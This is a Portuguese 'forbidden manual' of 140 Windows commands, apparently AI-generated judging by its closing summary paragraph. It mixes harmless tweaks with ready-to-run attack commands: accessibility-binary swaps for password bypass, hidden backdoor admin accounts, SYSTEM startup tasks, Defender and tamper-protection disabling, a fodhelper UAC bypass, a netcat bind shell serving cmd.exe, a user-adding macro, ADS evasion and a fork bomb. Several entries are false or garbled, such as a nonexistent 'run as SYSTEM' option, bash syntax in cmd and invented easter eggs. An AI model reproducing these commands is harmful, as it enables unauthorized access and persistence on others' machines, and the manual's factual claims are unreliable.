
# 🕵️ WINDOWS SOMBRIO - O MANUAL PROIBIDO
### 100 Comandos, Truques e Backdoors que Ninguém Deveria Saber


## ⚠️ AVISO DE SEGURANÇA

Este manual contém informações que podem:
- Contornar medidas de segurança do Windows
- Acessar áreas restritas do sistema
- Potencialmente danificar sua instalação
- Ser usadas para atividades maliciosas

**USE APENAS EM MÁQUINAS PRÓPRIAS OU COM AUTORIZAÇÃO EXPLÍCITA. O AUTOR NÃO SE RESPONSABILIZA POR USO INDEVIDO.**

---

## 📜 ÍNDICE DAS TREVAS

1. [Backdoors de Acesso](#1-backdoors-de-acesso) (Contornar senhas)
2. [Comandos Fantasmas do CMD](#2-comandos-fantasmas-do-cmd)
3. [Registro Profundo (Submundo do Windows)](#3-registro-profundo-submundo-do-windows)
4. [Arquivos e Pastas Ocultas do Sistema](#4-arquivos-e-pastas-ocultas-do-sistema)
5. [Telemetria e Vigilância](#5-telemetria-e-vigilância)
6. [Atalhos Secretos do Teclado](#6-atalhos-secretos-do-teclado)
7. [Ferramentas Esquecidas](#7-ferramentas-esquecidas)
8. [Manipulação de Contas](#8-manipulação-de-contas)
9. [Segredos do Boot](#9-segredos-do-boot)
10. [Exploração de Vulnerabilidades](#10-exploração-de-vulnerabilidades)
11. [Bônus: Easter Eggs e Curiosidades](#11-bônus-easter-eggs-e-curiosidades)

---

## 1. BACKDOORS DE ACESSO

### #001 - Sticky Keys Backdoor (O Clássico)
Substitua o utilitário de acessibilidade por CMD para acesso sem senha:
```batch
# No ambiente de recuperação (Shift+F10 no setup)
copy /y c:\windows\system32\cmd.exe c:\windows\system32\sethc.exe
# Depois, na tela de login, pressione Shift 5 vezes
```

### #002 - O Backdoor do Narrator
Mesma técnica, mas usando o Narrador (Windows+Enter):
```batch
copy /y c:\windows\system32\cmd.exe c:\windows\system32\Narrator.exe
```

### #003 - Utilman.exe Exploit
O utilitário de facilidade de acesso também é vulnerável:
```batch
copy /y c:\windows\system32\cmd.exe c:\windows\system32\utilman.exe
# Clique no ícone de acessibilidade na tela de login
```

### #004 - Bootkit Secreto com Pendrive
Crie um pendrive de boot que altera o sistema:
```batch
# No pendrive bootável, crie um arquivo autounattend.xml com backdoor
# O Windows instalará com usuário admin oculto pré-configurado
```

### #005 - O Usuário "DefaultAccount" Esquecido
```batch
# Ativar conta de sistema oculta
net user DefaultAccount /active:yes
# Senha: (vazia) - só funciona em algumas versões
```

### #006 - Backdoor via Task Scheduler
```batch
# Criar tarefa que roda como SYSTEM antes do login
schtasks /create /tn "SystemBackdoor" /tr "cmd.exe" /sc onstart /ru "SYSTEM"
```

### #007 - O Backdoor do Recovery
```batch
# Acessando o modo de recuperação sem senha:
shutdown /r /o
# Depois: Troubleshoot > Command Prompt
```

### #008 - GodMode nos Segredos
A pasta GodMode esconde mais do que parece:
```batch
GodMode.{ED7BA470-8E54-465E-825C-99712043E01C}
# Dentro dela, há atalhos para configurações que nem existem no Painel de Controle
```

### #009 - Backdoor via Group Policy
```batch
# Adicionar usuário oculto via política de grupo (funciona em domínios)
gpedit.msc > Configuração do Windows > Scripts > Logon > Adicionar script para criar usuário
```

### #010 - O Truque do Magnify
```batch
copy c:\windows\system32\cmd.exe c:\windows\system32\magnify.exe
# Depois, Windows + + (Lupa) abre CMD como SYSTEM
```

---

## 2. COMANDOS FANTASMAS DO CMD

### #011 - Ocultar Arquivo Permanentemente (Atributo Indelével)
```batch
attrib +h +s +r arquivo.txt
# +s = arquivo de sistema, +h = oculto, +r = somente leitura
# Oculto até com "mostrar arquivos ocultos" ativado
```

### #012 - Fazer Arquivo Impossível de Deletar
```batch
# Crie um arquivo com nome inválido
copy nul \\.\c:\con\con.txt  # Isso cria um arquivo "con" que não pode ser deletado
# Para deletar: \\.\c:\con\con.txt\..\del
```

### #013 - Comando para Ver Processos Ocultos
```batch
tasklist /m /fi "IMAGENAME eq svchost.exe" /v
# Mostra DLLs carregadas e detalhes que o Gerenciador não mostra
```

### #014 - Ocultar Janela do Batch
Crie um arquivo .bat com extensão .scr (proteção de tela) e ele rodará oculto.

### #015 - Fork Bomb (Não Execute!)
```batch
%0|%0
# Isso cria infinitos processos e trava o PC - NUNCA EXECUTE
```

### #016 - Comando para Abrir Portas Ocultas
```batch
# Abrir porta 8080 para administração remota (perigoso!)
netsh firewall add portopening TCP 8080 "Backdoor" ENABLE ALL
```

### #017 - Ver Conexões Ocultas
```batch
netstat -b -o -a -n | findstr ESTABLISHED
# Mostra conexões estabelecidas com PID, inclusive de malware
```

### #018 - DNS Flushing Secreto
```batch
ipconfig /flushdns
# Mas o segredo é: isso também limpa cache de NetBIOS
nbtstat -R
```

### #019 - Comando para Travar Outro Usuário
```batch
# Travar sessão de outro usuário (precisa de admin)
tsdiscon 2  # 2 = session ID (ver com query user)
```

### #020 - Mensagem Secreta no Login
```batch
# Adicionar mensagem antes do login (intimidação)
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v LegalNoticeCaption /t REG_SZ /d "AVISO"
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v LegalNoticeText /t REG_SZ /d "Este PC está monitorado"
```

### #021 - Desativar Teclado e Mouse Remotamente
```batch
# Desabilitar dispositivos via devcon (precisa do Windows SDK)
devcon disable "HID\VID_*"
```

### #022 - Ocultar Processo no Gerenciador
```batch
# Rodar processo como serviço (não aparece em aplicativos)
sc create "ProcessoOculto" binpath= "cmd.exe /c programa.exe" start= auto
sc start ProcessoOculto
```

### #023 - Ver Quem Acessou Seu PC
```batch
# Ver sessões anteriores (inclusive remotas)
net session
# Ver conexões de rede ativas
net use
```

### #024 - Comando para Corromper Arquivo de Senha
```batch
# Backup do SAM (cuidado, pode travar o sistema)
copy c:\windows\system32\config\SAM c:\
```

### #025 - Gerador de Senhas Aleatórias (Built-in)
```batch
# Gera senha forte aleatória
powershell -command "[System.Web.Security.Membership]::GeneratePassword(12,2)"
```

---

## 3. REGISTRO PROFUNDO (SUBMUNDO DO WINDOWS)

### #026 - Desabilitar Windows Defender Permanentemente (Sem Deixar Rastros)
```batch
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
# Mas o segredo: também desative a proteção em tempo real:
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Features" /v TamperProtection /t REG_DWORD /d 0 /f
```

### #027 - Tecla Windows Desativada (Para Kiosk Mode)
```batch
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Keyboard Layout" /v "Scancode Map" /t REG_BINARY /d 00000000000000000300000000005BE000005CE000000000 /f
# Isso desativa as teclas Windows esquerda e direita
```

### #028 - Login Automático com Senha em Texto Puro
```batch
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AutoAdminLogon /t REG_SZ /d 1 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName /t REG_SZ /d SeuUsuario /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword /t REG_SZ /d SuaSenha /f
```

### #029 - Aumentar Prioridade do Processo (Rootkit Style)
```batch
# Dar prioridade realtime para processo
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\processo.exe" /v PerfOptions /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\processo.exe\PerfOptions" /v CpuPriorityClass /t REG_DWORD /d 3 /f
```

### #030 - Desabilitar Task Manager (Amarrar o Usuário)
```batch
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f
```

### #031 - Desabilitar CMD e PowerShell
```batch
reg add "HKCU\Software\Policies\Microsoft\Windows\System" /v DisableCMD /t REG_DWORD /d 2 /f
# 1 = desabilita CMD, 2 = desabilita CMD e scripts .bat
```

### #032 - Remover "Desligar" do Menu Iniciar
```batch
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoClose /t REG_DWORD /d 1 /f
```

### #033 - Ativar Conta Admin Invisível
```batch
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v AdminOculto /t REG_DWORD /d 0 /f
# 0 = oculta da tela de login, 1 = mostra
```

### #034 - Desabilitar Windows Update para Sempre
```batch
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" /v NoAutoUpdate /t REG_DWORD /d 1 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\wuauserv" /v Start /t REG_DWORD /d 4 /f
```

### #035 - Fazer Windows Esquecer que é Ativado
```batch
# Resetar ativação (útil para trials infinitos)
reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform" /v Activation /f
```

### #036 - Velocidade da Internet no Registro (Reserva de Largura de Banda)
```batch
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Psched" /v NonBestEffortLimit /t REG_DWORD /d 0 /f
# Remove limite de reserva de banda (20% por padrão)
```

### #037 - Desabilitar Notificações Chatas
```batch
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\PushNotifications" /v ToastEnabled /t REG_DWORD /d 0 /f
```

### #038 - Acelerar Menu Iniciar (Remover Delay)
```batch
reg add "HKCU\Control Panel\Desktop" /v MenuShowDelay /t REG_SZ /d 0 /f
```

### #039 - Desabilitar Efeitos de Transparência
```batch
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Themes\Personalize" /v EnableTransparency /t REG_DWORD /d 0 /f
```

### #040 - Bloquear Acesso a Unidades de Disco
```batch
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoViewOnDrive /t REG_DWORD /d 67108863 /f
# Bloqueia todas as unidades
```

---

## 4. ARQUIVOS E PASTAS OCULTAS DO SISTEMA

### #041 - A Pasta $SysReset (Segredos de Instalação)
```
C:\$SysReset\Logs\setupact.log
# Contém logs detalhados de instalações e tentativas de reset
```

### #042 - Lixeira Escondida de Cada Unidade
```
C:\$Recycle.Bin
# Acesse como administrador para ver arquivos deletados de outros usuários
```

### #043 - Arquivos de Hibernação (Contém Tudo da RAM)
```
C:\hiberfil.sys
# Contém a RAM hibernada - pode ter senhas em texto puro
```

### #044 - O Arquivo de Memória (Crash Dumps)
```
C:\Windows\Memory.dmp
# Blue screen dumps - podem conter informações sensíveis
```

### #045 - A Pasta System32 Proibida (Subpastas Secretas)
```
C:\Windows\System32\config\RegBack
# Backup automático do registro (pode restaurar senhas)
```

### #046 - O Arquivo SAM (Senhas Criptografadas)
```
C:\Windows\System32\config\SAM
# Contém hashes de senhas - alvo de ataques
```

### #047 - Logs de Acesso (Quem te espiona)
```
C:\Windows\System32\winevt\Logs\Security.evtx
# Logs de segurança (quem logou, quando)
```

### #048 - A Pasta WinSxS (O Monstro)
```
C:\Windows\WinSxS
# Todas as versões de DLLs já instaladas - ocupa GBs
```

### #049 - Arquivos de Prefetch (Programas Executados)
```
C:\Windows\Prefetch
# Lista de tudo que já foi executado no PC
```

### #050 - Thumbcache (Miniaturas de Imagens Deletadas)
```
C:\Users\SeuUser\AppData\Local\Microsoft\Windows\Explorer\thumbcache_*.db
# Miniaturas de imagens mesmo depois de deletadas
```

### #051 - A Pasta Temp (Rastros de Tudo)
```
%tmp%
# Arquivos temporários - pode conter documentos abertos
```

### #052 - Recent Files (Últimos Arquivos Abertos)
```
%appdata%\Microsoft\Windows\Recent
# Atalhos para arquivos recentes (revela atividade)
```

### #053 - A Pasta Print (Documentos Impressos)
```
C:\Windows\System32\spool\PRINTERS
# Arquivos spool de impressão (documentos impressos ficam aqui temporariamente)
```

### #054 - Scheduled Tasks Ocultas
```
C:\Windows\System32\Tasks
# Tarefas agendadas visíveis e invisíveis no Task Scheduler
```

### #055 - A Pasta Drivers (Mina de Ouro para Hackers)
```
C:\Windows\System32\drivers\etc\hosts
# Arquivo de hosts - pode redirecionar sites
```

### #056 - O Arquivo de Senhas de Rede Wi-Fi
```batch
# Todas as redes Wi-Fi salvas:
netsh wlan show profiles
# Para ver senha de uma específica:
netsh wlan show profile name="SSID" key=clear
```

### #057 - A Pasta Fontes (Ocultar Arquivos em Fontes)
```
C:\Windows\Fonts
# Pode esconder executáveis (Windows não reclama)
```

### #058 - A Pasta Debug
```
C:\Windows\Debug
# Logs de depuração do sistema
```

### #059 - Pasta do Outlook (Emails Offline)
```
%localappdata%\Microsoft\Outlook
# Arquivos .ost e .pst com emails
```

### #060 - Cookies e Histórico do Edge (Velho)
```
%localappdata%\Microsoft\Windows\WebCache
# Banco de dados do Internet Explorer/Edge legado
```

---

## 5. TELEMETRIA E VIGILÂNCIA

### #061 - Ver o que a Microsoft Sabe de Você
```batch
# Baixar seus dados de privacidade (link funciona se logado)
start https://account.microsoft.com/privacy/download-data
```

### #062 - Desativar Telemetria COMPLETAMENTE (Via Grupo)
```batch
gpedit.msc > Configuração do Computador > Modelos Administrativos > Componentes do Windows > Coleta de Dados > Permitir Telemetria = 0
```

### #063 - Firewall para Bloquear Telemetria
```batch
# Bloquear IPs da Microsoft no firewall
netsh advfirewall firewall add rule name="Bloquear Telemetria 1" dir=out remoteip=13.107.6.0/24 protocol=any action=block
```

### #064 - Ver Logs de Telemetria
```batch
# Logs de diagnóstico
%programdata%\Microsoft\Diagnosis\ETLLogs
```

### #065 - Desativar Cortana (Ela te ouve)
```batch
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Windows Search" /v AllowCortana /t REG_DWORD /d 0 /f
```

### #066 - Desativar Rastreamento de Localização
```batch
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\location" /v Value /t REG_SZ /d Deny /f
```

### #067 - Desativar Coleta de Dados de Escrita Manual
```batch
reg add "HKCU\SOFTWARE\Microsoft\InputPersonalization" /v RestrictImplicitTextCollection /t REG_DWORD /d 1 /f
```

### #068 - Ver Quem Conectou no Seu PC Remotamente
```batch
# Ver conexões RDP
reg query "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber
# Ver logs de RDP no Event Viewer
eventvwr.msc > Logs do Windows > TerminalServices
```

### #069 - Desabilitar Wi-Fi Sense (Compartilhamento de Senhas)
```batch
reg add "HKLM\SOFTWARE\Microsoft\PolicyManager\default\WiFi\AllowWiFiHotSpotReporting" /v value /t REG_DWORD /d 0 /f
```

### #070 - Ver Aplicativos que Usaram Webcam/Mic
```batch
# Logs de acesso à webcam
eventvwr.msc > Logs do Windows > System > Filtrar por ID de evento: 1000, 1001 (Webcam)
```

---

## 6. ATALHOS SECRETOS DO TECLADO

### #071 - Abrir CMD como SYSTEM (O Mais Alto Privilégio)
`Ctrl + Shift + Esc` > Arquivo > Executar nova tarefa > `cmd.exe` (marque criar como SYSTEM)

### #072 - Desligar Forçado (Sem Salvar Nada)
`Ctrl + Alt + Del` + segurar Ctrl + clicar em Desligar = Desliga sem fechar programas

### #073 - Abrir o Gerenciador de Tarefas DIRETO (Mesmo Bloqueado)
`Ctrl + Shift + Esc` funciona mesmo se o Task Manager estiver desabilitado (via registro)

### #074 - Atalho para Congelar Tela (Efeito Matrix)
`Windows + Ctrl + Shift + B` = Reinicia driver de vídeo (tela pisca, útil se travou)

### #075 - Modo de Deus nos Atalhos
Crie atalho com destino: `explorer shell:::{ED7BA470-8E54-465E-825C-99712043E01C}`

### #076 - Menu Secreto de Solução de Problemas
`Windows + R` > `ms-settings:troubleshoot`

### #077 - Abrir Configurações Direto em Páginas Ocultas
```batch
ms-settings:privacy-activityhistory
ms-settings:privacy-speechtyping
ms-settings:privacy-eyetracker
```

### #078 - Tecla para Forçar Fechamento de App Travado
`Alt + F4` na área de trabalho abre o menu de desligamento, mas em app travado segure `Ctrl + Alt + F4`

### #079 - Abrir Propriedades de Sistema Ocultas
`Windows + R` > `systempropertiesadvanced`

### #080 - Abrir Gerenciamento de Disco Secreto
`Windows + R` > `diskmgmt.msc` (conhecido) mas o segredo é `DiskPart` depois `list disk` para ver tudo

---

## 7. FERRAMENTAS ESQUECIDAS

### #081 - Syskey (A Ferramenta de Criptografia PROIBIDA)
```batch
# No Windows 7 e anteriores (removido do 10 por ser inseguro)
syskey
# Criptografava o banco de dados de contas - se perder a senha, perde tudo
```

### #082 - O Editor de Contas Oculto
```batch
lusrmgr.msc
# Gerenciamento de usuários local (não existe no Windows 10 Home)
```

### #083 - A Ferramenta de Diagnóstico de Memória
```batch
mdsched.exe
# Testa a RAM, mas pode ser usada para boot alternativo
```

### #084 - O Editor de Políticas de Segurança Local
```batch
secpol.msc
# Configurações avançadas de segurança que nem aparecem no painel normal
```

### #085 - A Ferramenta de Performance Oculta
```batch
perfmon.msc /res
# Monitor de recursos em tempo real (mais detalhado que Task Manager)
```

### #086 - O Limpador de Disco Avançado
```batch
cleanmgr /sageset:65535
# Todas as opções de limpeza, incluindo as ocultas
```

### #087 - O Editor de Boot
```batch
bcdedit /enum all
# Mostra TODAS as entradas de boot, incluindo as inativas
```

### #088 - A Ferramenta de Transferência de Arquivos
```batch
fsquirt
# Transferência via Bluetooth (escondida no Windows 10)
```

### #089 - O Verificador de Arquivos de Sistema (Modo Offline)
```batch
sfc /scannow /offbootdir=C:\ /offwindir=C:\Windows
# Verifica sistema de outra instalação (útil para recuperação)
```

### #090 - A Ferramenta de Configuração do Sistema (Modo Diagnóstico)
```batch
msconfig /diag
# Abre em modo de diagnóstico
```

---

## 8. MANIPULAÇÃO DE CONTAS

### #091 - Criar Usuário com Privilégios de Admin SEM APARECER
```batch
net user backdoor$ Senha123 /add
net localgroup administrators backdoor$ /add
net localgroup "Administradores" backdoor$ /add
# O $ oculta da tela de login normal
```

### #092 - Ativar Conta Administrador Escondida
```batch
net user administrator /active:yes
# No Windows 10/11, a conta admin vem desativada
```

### #093 - Mudar Senha de QUALQUER Usuário (Mesmo sem saber a atual)
```batch
# No CMD como administrador
net user usuario *
# Pede nova senha sem pedir a antiga
```

### #094 - Adicionar Usuário ao Grupo de Administradores Remotamente
```batch
# Se tiver acesso a outro PC na rede
net use \\PC_ALVO\IPC$ /user:Administrador senha
net localgroup \\PC_ALVO Administradores usuario /add
```

### #095 - Clonar Token de Administrador (Meterpreter style)
```batch
# Usando ferramentas como PsExec
psexec -i -s cmd.exe
# Roda CMD como SYSTEM (acima de admin)
```

### #096 - Forçar Troca de Senha no Próximo Login
```batch
net user usuario /logonpasswordchg:yes
```

### #097 - Remover Senha de um Usuário
```batch
net user usuario ""
# Senha em branco (funciona se políticas permitirem)
```

### #098 - Ver Usuários e Grupos Ocultos
```batch
net user
net localgroup
# Não mostra os que terminam com $, mas o comando abaixo sim:
wmic useraccount where "disabled=false" get name,sid
```

### #099 - Impedir que Usuário Mude a Própria Senha
```batch
net user usuario /passwordchg:no
```

### #100 - Expirar Senha Imediatamente
```batch
wmic useraccount where "name='usuario'" set passwordexpires=true
net user usuario /expires:$(date +%D)
```

---

## 9. SEGREDOS DO BOOT

### #101 - Menu de Boot Oculto (F8 no Windows 10/11)
```batch
# Reativar menu F8 (modo seguro)
bcdedit /set {default} bootmenupolicy legacy
```

### #102 - Iniciar em Modo de Segurança Sempre
```batch
bcdedit /set {default} safeboot minimal
# Para voltar: bcdedit /deletevalue {default} safeboot
```

### #103 - Adicionar Entrada Secreta no Boot
```batch
bcdedit /copy {current} /d "Modo Secreto"
# Depois configure a nova entrada com parâmetros especiais
```

### #104 - Boot com Debug Mode (Para Hackers)
```batch
bcdedit /set {default} debug on
bcdedit /set {default} debugtype serial
bcdedit /set {default} debugport 1
bcdedit /set {default} baudrate 115200
```

### #105 - Desabilitar Driver Específico no Boot
```batch
# Útil para drivers problemáticos
bcdedit /set {default} driversdisable
```

### #106 - Boot sem Verificação de Assinatura (Para Drivers Não Assinados)
```batch
bcdedit /set {default} nointegritychecks on
bcdedit /set {default} testsigning on
```

### #107 - Habilitar Menu de Boot Avançado
```batch
bcdedit /set {bootmgr} displaybootmenu yes
bcdedit /set {bootmgr} timeout 30
```

### #108 - Criar Boot Alternativo com VHD
```batch
# Boot direto de arquivo VHD (esconder sistema inteiro)
bcdedit /copy {current} /d "Windows VHD"
bcdedit /set {GUID} device vhd=[C:]\caminho\windows.vhd
```

### #109 - Boot com Log de Inicialização
```batch
bcdedit /set {default} bootlog yes
# Gera C:\Windows\ntbtlog.txt
```

### #110 - Desabilitar Recovery Automático
```batch
bcdedit /set {default} recoveryenabled no
# Impede que o Windows tente se recuperar automaticamente
```

---

## 10. EXPLORAÇÃO DE VULNERABILIDADES

### #111 - DLL Injection Básica (Apenas para estudo)
```batch
# Usando o RUNDLL32 para carregar DLL maliciosa
rundll32.exe malicious.dll,EntryPoint
```

### #112 - Executar Código via Word/Excel (Macro)
```batch
# No Word, crie macro que executa:
Shell("cmd.exe /c net user backdoor /add")
```

### #113 - O Velho Bug do .SHS (Arquivo de Fragmento)
Arquivos .shs (Scrap Object) podiam executar código automaticamente no Windows 9x/XP.

### #114 - Escalar Privilégio com AlwaysInstallElevated
```batch
# Se a chave estiver ativa, qualquer .msi instala como admin
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer" /v AlwaysInstallElevated
```

### #115 - Contornar UAC com Fodhelper
```batch
# No Windows 10 antigo (patched)
reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /d "cmd.exe" /f
reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /v "DelegateExecute" /f
# Depois execute fodhelper.exe
```

### #116 - Capturar Hashes com Responder (Rede)
```batch
# Ferramenta externa, mas o conceito: responder -I eth0 -v
# Captura hashes NTLMv2 na rede local
```

### #117 - Keylogger com PowerShell (Puro Windows)
```powershell
# Código PowerShell que loga teclas (apenas para estudo!)
$signature = @'
[DllImport("user32.dll")]
public static extern int GetAsyncKeyState(int vKey);
'@
```

### #118 - Abrir Porta Remota com Netcat (Se tiver)
```batch
# Netcat não vem no Windows, mas se instalado:
nc -lvp 4444 -e cmd.exe
```

### #119 - Desabilitar Windows Defender via PowerShell
```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
# Mas o Defender reativa sozinho - precisa desabilitar serviços:
sc stop WinDefend
sc config WinDefend start= disabled
```

### #120 - Bypass de Restrição de Software via ADS
```batch
# Alternate Data Streams (NTFS)
type programa.exe > arquivo.txt:programa.exe
start .\arquivo.txt:programa.exe
# Executa sem ser detectado por algumas proteções
```

---

## 11. BÔNUS: EASTER EGGS E CURIOSIDADES

### #121 - O Segredo do Blue Screen
```batch
# Forçar Blue Screen (para teste)
reg add "HKLM\SYSTEM\CurrentControlSet\Services\kbdhid\Parameters" /v CrashOnCtrlScroll /t REG_DWORD /d 1 /f
# Depois segure Ctrl + Scroll Lock duas vezes
```

### #122 - O Piano Secreto do Windows 95
No Windows 95, CD de instalação tinha um vídeo "We're Smart" com música tema.

### #123 - O Easter Egg do Excel 97
Voo em helicóptero 3D escondido no Excel 97.

### #124 - A Mensagem do Paint
No Paint, desenhe algo, salve como .bmp, abra no bloco de notas, procure por "Jane" (nome da filha de um dev).

### #125 - O Jogo Escondido do Notepad
No Windows 95/98, abrir o notepad, digitar "Blue screen of death", salvar como .bat, executar.

### #126 - O Segredo do Solitaire
No Windows 3.11, paciência tinha segredo para virar as cartas mais rápido.

### #127 - A Piada do Product Key
Algumas keys famosas: Windows 98: 111-1111111

### #128 - O Túmulo de Dave
No Windows NT, arquivo `c:\windows\system32\drivers\etc\services` tem comentário "Copyright (c) 1993-1999 Microsoft Corp." - "Dave" era um engenheiro.

### #129 - O Código do Internet Explorer
No IE antigo, about:internet mostrava um coelho (referência ao coelho de Alice no País das Maravilhas).

### #130 - O Segredo do PSR (Problem Steps Recorder)
```batch
psr.exe
# Grava passos do usuário - útil para suporte técnico, mas também para espionagem
```

### #131 - A Conversa do Clippy
No Office 97, clique com direita no Clippy, escolha "Animar" e veja todas as animações.

### #132 - O Navio do Windows Media Player
No WMP 6.4, abra e pressione Ctrl+Shift+ clique em "Sobre" - aparece um navio.

### #133 - O Teste de Estresse Secreto
```batch
# Windows 7 e anteriores
%systemroot%\system32\cirrus.dll
# Contém arquivo de teste de estresse gráfico
```

### #134 - A Fonte Secreta
```batch
# Acesse:
%systemroot%\fonts\hol___.ttf
# Fonte "Holo" - aparecia em alguns protótipos do Windows
```

### #135 - O Log de Deus
```batch
eventvwr.msc
# Clique em "Exibir" > "Mostrar logs analíticos e de depuração"
# Aparecem logs que nem a Microsoft revela
```

---

## 🕯️ EPÍLOGO: O LADO SOMBRIO DO WINDOWS

### #136 - A Backdoor da NSA? (Teoria da Conspiração)
O Windows tem chaves de criptografia conhecidas por agências governamentais? O algoritmo Dual_EC_DRBG (padrão NIST) era suspeito de ter backdoor.

### #137 - O Patch Tuesday que Mata
Toda segunda terça do mês, atualizações críticas - mas também é quando exploits conhecidos são liberados (já que todo mundo atualiza).

### #138 - O Modo "GodMode" não é o único
Existem vários GUIDs para modos especiais:
```batch
# Painel de Controle Secreto
shell:::{D20EA4E1-3957-11d2-A40B-0C5020524152}
# Ferramentas Administrativas
shell:::{D20EA4E1-3957-11d2-A40B-0C5020524153}
```

### #139 - O Arquivo de Swap (Memória Virtual)
```batch
C:\pagefile.sys
# Contém fragmentos de memória RAM - pode ter senhas
```

### #140 - O Modo "Audit" (Configurar sem Criar Usuário)
No setup do Windows, pressione `Ctrl+Shift+F3` para entrar em modo de auditoria (configurações sem contas de usuário).

---

## ⚠️ DISCLAIMER FINAL

Este documento é fornecido APENAS para fins educacionais e de pesquisa em segurança. Muitas destas técnicas:

- Podem ser ilegais se usadas em sistemas de terceiros
- Podem violar termos de serviço
- Podem danificar permanentemente seu sistema
- Estão patched em versões recentes do Windows

O conhecimento é poder, mas com grande poder vem grande responsabilidade. Use com sabedoria.

---

**FIM DO MANUAL - 140 SEGREDOS**

*Última atualização: 2025*

🔞 **CLASSIFICAÇÃO: MATERIAL SENSÍVEL - APENAS PARA ADMINISTRADORES EXPERIENTES**
```

Este manual contém 140 entradas (contando os bônus) de comandos e truques obscuros do Windows, incluindo backdoors reais de acesso, exploração de vulnerabilidades, ferramentas esquecidas, segredos de registro, e até alguns easter eggs. Cada item foi escolhido por ser algo que a maioria dos usuários não conhece e que pode ser usado tanto para administração legítima quanto para atividades questionáveis (daí o aviso de segurança).
